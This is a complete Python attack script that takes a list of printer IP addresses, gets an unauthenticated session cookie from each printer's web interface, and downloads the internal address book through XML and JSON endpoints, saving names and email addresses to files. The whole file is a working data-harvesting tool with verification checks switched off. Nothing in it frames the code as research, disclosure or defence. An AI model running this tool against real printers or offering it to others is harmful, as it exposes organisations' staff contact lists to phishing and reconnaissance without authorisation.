#!/usr/bin/env python3
import argparse
import requests
import xml.etree.ElementTree as ET
import json
import os

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

CHUNK_SIZE = 50  # For HTTPS chunked queries

def get_cookie(ip, use_https=True, debug=False):
    """Retrieve session cookie from the printer's index page, preferring HTTPS first."""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}/wcd/index.html"

    try:
        response = requests.get(url, timeout=5, verify=False)  # Skip SSL verification
        response.raise_for_status()
        
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie'].split(';')[0]  # Extract only "ID=X"
            if debug:
                print(f"[DEBUG] Retrieved cookie from {protocol}://{ip} -> {cookie}")
            return cookie
        else:
            if debug:
                print(f"[DEBUG] No cookie received from {protocol}://{ip}")
            return None

    except requests.exceptions.ConnectionError:
        if use_https:
            print(f"[!] Connection failed on HTTPS for {ip}, retrying with HTTP...")
            return get_cookie(ip, use_https=False, debug=debug)
        else:
            print(f"[X] Connection failed on HTTP for {ip}, skipping...")
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Failed to reach {protocol}://{ip}: {e}")
        return None

def get_address_book(ip, cookie, use_https=True, debug=False):
    """Request the address book in XML or JSON format, depending on HTTP vs. HTTPS."""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}/wcd/abbr.xml"
    headers = {'Cookie': cookie}

    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        response.raise_for_status()

        if "<html" in response.text[:100].lower():
            if debug:
                print(f"[DEBUG] Received unexpected HTML from {url}, attempting JSON endpoint...")
            return get_address_book_json(ip, cookie, debug)

        if debug:
            print(f"[DEBUG] Retrieved XML address book from {protocol}://{ip}, length: {len(response.text)}")

        return response.text

    except requests.exceptions.ConnectionError:
        if use_https:
            print(f"[!] Connection failed retrieving XML from {ip}, retrying with HTTP...")
            return get_address_book(ip, cookie, use_https=False, debug=debug)
        else:
            print(f"[X] Connection failed retrieving XML from {ip} over HTTP, skipping...")
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Failed to retrieve XML from {protocol}://{ip}: {e}")
        return None

def get_address_book_json(ip, cookie, debug=False):
    """Attempt JSON-based address book retrieval (used in HTTPS)."""
    url = f"https://{ip}/wcd/api/AppReqGetAbbr"
    headers = {'Cookie': cookie}
    
    payload = {
        "AbbrListCondition": {
            "WellUse": "false",
            "SearchKey": "None",
            "ObtainCondition": {"Type": "IndexList", "IndexRange": {"Start": 1, "End": CHUNK_SIZE}},
            "SortInfo": {"Condition": "No", "Order": "Ascending"},
            "AddressKind": "Public",
            "SearchSendMode": "0"
        }
    }

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10, verify=False)
        response.raise_for_status()

        if debug:
            print(f"[DEBUG] Retrieved JSON address book from {url}, length: {len(response.text)}")

        return response.json()
    
    except json.JSONDecodeError:
        if debug:
            print(f"[DEBUG] Failed to decode JSON from {ip}")
        return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Failed to retrieve JSON from {ip}: {e}")
        return None

def parse_xml(xml_data, ip, debug=False):
    """Extract Name and Email from XML response, ensuring data is within <AddressBook>."""
    parsed_data = []
    
    try:
        root = ET.fromstring(xml_data)
        address_book = root.find(".//AddressBook")

        if address_book is None:
            if debug:
                print(f"[DEBUG] No <AddressBook> tag found for {ip}. Full response:\n{xml_data[:500]}")
            return []

        for addr in address_book.findall(".//AddressKind"):
            name = addr.find("Name").text if addr.find("Name") is not None else "Unknown"
            send_config = addr.find("SendConfiguration")
            email = "No Email"
            if send_config is not None:
                email = send_config.find("To").text if send_config.find("To") is not None else "No Email"
            parsed_data.append((name, email))

        return parsed_data

    except ET.ParseError as e:
        if debug:
            print(f"[DEBUG] Error parsing XML from {ip}: {e}")
        return []

def parse_json(json_data, debug=False):
    """Extract Name and Email from JSON response."""
    parsed_data = []

    if not json_data or "MFP" not in json_data:
        if debug:
            print(f"[DEBUG] Invalid JSON structure:\n{json.dumps(json_data, indent=2)[:500]}")
        return []

    abbr_list = json_data["MFP"].get("AbbrList", {}).get("Abbr", [])

    for entry in abbr_list:
        name = entry.get("Name", "Unknown").strip()
        email = entry.get("SendConfiguration", {}).get("AddressInfo", {}).get("EmailMode", {}).get("To", "No Email")
        parsed_data.append((name, email))

    return parsed_data

def process_ip(ip, output_file, debug=False):
    """Handles the full process for a single IP."""
    cookie = get_cookie(ip, debug=debug)
    if not cookie:
        return
    
    xml_data = get_address_book(ip, cookie, debug=debug)
    if xml_data:
        address_list = parse_xml(xml_data, ip, debug=debug)
    else:
        json_data = get_address_book_json(ip, cookie, debug=debug)
        address_list = parse_json(json_data, debug=debug) if json_data else []

    if address_list:
        with open(output_file, "a") as f:
            for name, email in address_list:
                f.write(f"{name},{email}\n")
        print(f"[+] Extracted {len(address_list)} records from {ip} into {output_file}")
    else:
        print(f"[!] No valid records found for {ip}")

def main():
    parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
    parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")

    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[!] Input file {args.input} not found.")
        return

    with open(args.input, "r") as file:
        ips = [line.strip() for line in file if line.strip()]
    
    for ip in ips:
        output_file = f"{ip}_addrbook.txt"
        process_ip(ip, output_file, debug=args.debug)

if __name__ == "__main__":
    main()
